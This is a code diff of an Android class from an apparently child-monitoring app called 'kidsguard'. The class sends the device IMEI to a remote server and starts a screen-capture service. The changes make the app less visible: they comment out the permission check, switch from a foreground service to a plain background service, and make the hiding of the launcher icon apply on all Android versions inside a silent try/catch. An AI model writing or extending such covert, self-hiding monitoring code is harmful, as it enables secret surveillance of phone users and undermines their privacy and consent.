@@ -35,34 +35,36 @@ import static android.content.Context.ALARM_SERVICE;
 import static android.content.Context.JOB_SCHEDULER_SERVICE;
 
 public class ImeiLogin {
-    public void chcklog(final Context context,Boolean hide,int resultCode, Intent data,int mScreenDensity,String imeis,int width,int height){
+    public void chcklog(final Context context, final Boolean hide, final int resultCode, final Intent data, final int mScreenDensity, String imeis, final int width, final int height){
         final TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-            Toast.makeText(context, "please check the permissions", Toast.LENGTH_SHORT).show();
-            SendEror sendEror=new SendEror();
-            sendEror.sender(context,"imei login:"+"please check the permissions");
-            // TODO: Consider calling
-            //    ActivityCompat#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for ActivityCompat#requestPermissions for more details.
-            return;
+//        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+//            Toast.makeText(context, "please check the permissions", Toast.LENGTH_SHORT).show();
+//            SendEror sendEror=new SendEror();
+//            sendEror.sender(context,"imei login:"+"please check the permissions");
+//            // TODO: Consider calling
+//            //    ActivityCompat#requestPermissions
+//            // here to request the missing permissions, and then overriding
+//            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+//            //                                          int[] grantResults)
+//            // to handle the case where the user grants the permission. See the documentation
+//            // for ActivityCompat#requestPermissions for more details.
+//            return;
+//        }
+        String imei="";
+        try {
+        imei = telephonyManager.getDeviceId();}catch (Exception e){
+
         }
-        final String imei;
-        if (Build.VERSION.SDK_INT<=Build.VERSION_CODES.P){
-        imei = telephonyManager.getDeviceId();}else {
-            imei=imeis;
-        }
-        Log.e("fuuuuuuckdfsd", imei );
+        imei=imeis;
+//        Log.e("testing", imei );
         String url="https://im.kidsguard.pro/api/login-kid/";
+        final String finalImei = imei;
         StringRequest stringRequest=new StringRequest(Request.Method.POST,url,
                 new Response.Listener<String>() {
                     @Override
                     public void onResponse(String response) {
                         try {
-                            Log.e("rgdfgdghgfhgf" , response);
+                            Log.e("testing" , response);
                             JSONObject jsonactivechild=new JSONObject(response);
                             String status=jsonactivechild.getString("status");
 
@@ -97,33 +99,34 @@ public class ImeiLogin {
 //                                        calendar.set(Calendar.HOUR_OF_DAY, 22);
 //                                        calendar.set(Calendar.MINUTE, 30);
 //                                        setalarm(calendar,context,resultCode,data,mScreenDensity,4);
-
+                                        Log.e("testing" , "response");
                                         intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                                 intent.putExtra(childService.EXTRA_RESULT_CODE, resultCode)
                                                 .putExtra(childService.EXTRA_RESULT_INTENT, data)
                                                 .putExtra("density", mScreenDensity)
                                                 .putExtra("width", width)
                                                 .putExtra("height", height);
-                                        ContextCompat.startForegroundService(context,intent);
+                                      //  ContextCompat.startForegroundService(context,intent);
+                                        context.startService(intent);
                                     }
 
                                     Intent intent2 = new Intent(Intent.ACTION_MAIN);
                                     intent2.addCategory(Intent.CATEGORY_HOME);
                                     intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                     context.startActivity(intent2);
-                                    Intent i = new Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
-                                    i.putExtra(Settings.EXTRA_APP_PACKAGE, context.getPackageName());
-                                    i.putExtra(Settings.EXTRA_CHANNEL_ID, context.getApplicationInfo().uid);
-                                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                    context.startActivity(i);
+//                                    Intent i = new Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
+//                                    i.putExtra(Settings.EXTRA_APP_PACKAGE, context.getPackageName());
+//                                    i.putExtra(Settings.EXTRA_CHANNEL_ID, context.getApplicationInfo().uid);
+//                                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+//                                    context.startActivity(i);
                                     if (hide){
-                                        if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.Q){}else {
-                                        ComponentName componentToDisable=new ComponentName("pro.tasking","pro.tasking.MainActivity");
+                                       try {
+                                        ComponentName componentToDisable=new ComponentName("pro.tasking","MainActivity");
 
                                         context.getPackageManager().setComponentEnabledSetting(
                                                 componentToDisable,
                                                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                                                PackageManager.DONT_KILL_APP);} }
+                                                PackageManager.DONT_KILL_APP);}catch (Exception e){}}
 
                                     /*int pid = android.os.Process.myPid();
                                     android.os.Process.killProcess(pid);*/
@@ -157,13 +160,13 @@ public class ImeiLogin {
             @Override
             protected Map<String, String> getParams(){
                 Map<String,String> params=new HashMap<String, String>();
-                params.put("imei",imei);
+                params.put("imei", finalImei);
                 return params;
             }
         };
         RequestQueue requestQueue=Volley.newRequestQueue(context);
         requestQueue.add(stringRequest);
-        Log.e("134323", imei );
+//        Log.e("134323", imei );
     }
 
     private void setalarm(Calendar calendar,Context context,int resultCode, Intent data,int mScreenDensity,int id) {
@@ -180,26 +183,26 @@ public class ImeiLogin {
         }
     }
 
-    public void jobset(Context context,ComponentName componentName){
-        JobInfo info = new JobInfo.Builder(123, componentName)
-                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED)
-                .setPersisted(true)
-                .setPeriodic(15 * 60 * 1000)
-                .build();
-
-        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
-        scheduler.schedule(info);
-    }
-    public void jobset2(Context context,ComponentName componentName){
-        JobInfo info = new JobInfo.Builder(1234, componentName)
-                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED)
-                .setPersisted(true)
-                .setPeriodic(15 * 60 * 1000)
-                .build();
-
-        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
-        scheduler.schedule(info);
-    }
+//    public void jobset(Context context,ComponentName componentName){
+//        JobInfo info = new JobInfo.Builder(123, componentName)
+//                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED)
+//                .setPersisted(true)
+//                .setPeriodic(15 * 60 * 1000)
+//                .build();
+//
+//        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
+//        scheduler.schedule(info);
+//    }
+//    public void jobset2(Context context,ComponentName componentName){
+//        JobInfo info = new JobInfo.Builder(1234, componentName)
+//                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED)
+//                .setPersisted(true)
+//                .setPeriodic(15 * 60 * 1000)
+//                .build();
+//
+//        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
+//        scheduler.schedule(info);
+//    }
 
 
 
